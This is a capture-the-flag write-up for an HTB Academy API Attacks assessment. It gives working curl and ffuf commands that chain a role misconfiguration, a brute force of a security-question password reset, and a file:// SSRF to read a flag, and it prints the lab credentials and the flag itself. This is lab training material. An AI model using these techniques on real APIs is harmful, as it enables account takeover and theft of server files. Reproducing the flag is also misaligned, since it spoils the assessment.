# HTB Academy — API Attacks Skills Assessment

**Module:** API Attacks  
**Target:** `154.57.164.76:31249`  
**Credentials:** `htbpentester@hackthebox.com` / `HTBPentester`  
**Flag:** `HTB{f190b80cd543a84b236e92a07a9d8d59}`

---

## Scenario

Inlanefreight E-Commerce Marketplace REST API — v2. The admin patched all v1 vulnerabilities, but junior developers introduced new ones. Goal: compromise v2 and read `/flag.txt`.

---

## Attack Chain

### 1. Recon

```bash
curl -si http://154.57.164.76:31249/swagger
# Server: Kestrel — ASP.NET Core, same stack as v1

curl -s http://154.57.164.76:31249/swagger/v2/swagger.json | python3 -m json.tool | grep '"/api/'
# v2 endpoints enumerated. Notable new endpoints:
# - /api/v2/suppliers/current-user/cv (POST)
# - /api/v2/authentication/suppliers/passwords/resets/security-question-answers (POST)
# - /api/v2/products/photo (POST, multipart file upload)
# - /api/v2/customers/{CustomerID}/{City}/billing-addresses (GET)

# v0 and v1 are gone (both 404)
```

### 2. Authenticate as Customer — BFLA Discovery

```bash
curl -si -X POST http://154.57.164.76:31249/api/v2/authentication/customers/sign-in \
  -H "Content-Type: application/json; charset=utf-8" \
  -d '{"Email":"htbpentester@hackthebox.com","Password":"HTBPentester"}'
# JWT obtained. Roles in token: Suppliers_Get, Suppliers_GetAll
# Customer account assigned supplier roles — BFLA misconfiguration
```

```bash
curl -s http://154.57.164.76:31249/api/v2/roles/current-user -H "Authorization: Bearer $JWT"
# {"roles": ["Suppliers_Get", "Suppliers_GetAll"]}
```

### 3. Enumerate Suppliers (BFLA — API5)

```bash
curl -s http://154.57.164.76:31249/api/v2/suppliers -H "Authorization: Bearer $JWT" | jq
# All supplier records returned including:
# - id, companyID, name, email, securityQuestion, professionalCVPDFFileURI
# 5 suppliers have securityQuestion = "What is your favorite color?"
# All have professionalCVPDFFileURI = "SupplierDidNotUploadYet" (new SSRF field in v2)
```

Suppliers with real security questions:
- `P.Howard1536@globalsolutions.com`
- `L.Walker1872@globalsolutions.com`
- `T.Harris1814@globalsolutions.com`
- `B.Rogers1535@globalsolutions.com`
- `M.Alexander1650@globalsolutions.com`

### 4. Broken Authentication — Security Question Brute Force (API2)

The new v2 endpoint `/api/v2/authentication/suppliers/passwords/resets/security-question-answers` resets a supplier's password given their email, the answer to their security question, and a new password. No role required, no rate limiting.

```bash
# Create a comprehensive color wordlist (~75 colors)
python3 -c "c=[...75 colors...]; open('/tmp/colors.txt','w').write('\n'.join(c))"

# Brute-force each supplier's security question answer
ffuf -X POST \
  -u http://154.57.164.76:31249/api/v2/authentication/suppliers/passwords/resets/security-question-answers \
  -H "Content-Type: application/json; charset=utf-8" \
  -d '{"SupplierEmail":"B.Rogers1535@globalsolutions.com","SecurityQuestionAnswer":"FUZZ","NewPassword":"NewPassword123"}' \
  -w /tmp/colors.txt -mr "successStatus.:true"
# Match: rust — Brandon Rogers' answer is "rust"
```

### 5. Authenticate as Supplier

```bash
curl -si -X POST http://154.57.164.76:31249/api/v2/authentication/suppliers/sign-in \
  -H "Content-Type: application/json; charset=utf-8" \
  -d '{"Email":"B.Rogers1535@globalsolutions.com","Password":"NewPassword123"}'
# Supplier JWT obtained → $SJWT
# Note: Brandon Rogers has NO roles assigned
```

### 6. SSRF — Read /flag.txt via professionalCVPDFFileURI (API7)

The `PATCH /api/v2/suppliers/current-user` endpoint (Role: None) accepts a `ProfessionalCVPDFFileURI` field. The `GET /api/v2/suppliers/current-user/cv` endpoint fetches the file at that URI and returns it as base64.

```bash
# Step 1: Set the CV URI to the flag file
curl -si -X PATCH http://154.57.164.76:31249/api/v2/suppliers/current-user \
  -H "Content-Type: application/json; charset=utf-8" \
  -H "Authorization: Bearer $SJWT" \
  -d '{"SecurityQuestion":"What is your favorite color?","SecurityQuestionAnswer":"rust","PhoneNumber":"+44 9999999999","ProfessionalCVPDFFileURI":"file:///flag.txt","Password":"NewPassword123"}'
# {"SuccessStatus":true}

# Step 2: Read the file via the CV endpoint
curl -s http://154.57.164.76:31249/api/v2/suppliers/current-user/cv \
  -H "Authorization: Bearer $SJWT" | jq -r '.base64Data' | base64 -d
# HTB{f190b80cd543a84b236e92a07a9d8d59}
```

---

## Vulnerability Chain Summary

| Step | Vulnerability | Detail |
|------|--------------|--------|
| 1 | BFLA (API5) | Customer account `htbpentester@hackthebox.com` assigned supplier roles (`Suppliers_Get`, `Suppliers_GetAll`) |
| 2 | Broken Auth (API2) | Security question reset endpoint — no rate limiting, brute-forced "What is your favorite color?" → "rust" for Brandon Rogers |
| 3 | SSRF (API7) | `ProfessionalCVPDFFileURI` accepts `file://` URI; `GET /suppliers/current-user/cv` fetches and returns file contents as base64 |

---

## Key Lessons

- **v2 content-type:** Server requires `Content-Type: application/json; charset=utf-8` (not just `application/json`) — 415 Unsupported Media Type otherwise.
- **Security question brute force:** The question "What is your favorite color?" needs a comprehensive ~75-word color wordlist. Simple primary colors are insufficient — answer was "rust" (an uncommon shade).
- **New SSRF vector in v2:** Instead of product `PNGPhotoFileURI`, v2 introduces `ProfessionalCVPDFFileURI` on suppliers. Same file:// technique, new field and endpoint.
- **Role: None ≠ no authentication:** The PATCH and CV endpoints require a valid supplier JWT even though no specific role is needed. The supplier identity is verified by the JWT email matching a supplier record.
- **Try all targets:** Only one of 5 suppliers had a guessable color answer. Must enumerate all candidates, not just the first.
